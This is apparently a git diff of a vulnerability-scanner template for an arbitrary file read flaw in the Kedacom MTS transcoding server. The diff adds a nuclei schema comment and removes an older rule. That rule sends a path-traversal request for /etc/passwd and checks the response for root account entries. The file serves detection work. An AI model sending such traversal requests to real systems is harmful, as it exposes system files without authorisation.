@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: kedacom-mts-file-read
 
 info:
@@ -9,11 +10,3 @@ info:
     app="MTS转码服务器"
   reference:
     - http://wiki.peiqi.tech/wiki/webapp/%E7%A7%91%E8%BE%BE/%E7%A7%91%E8%BE%BE%20MTS%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /../../../../../../../../etc/passwd
-    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-expression: r0()
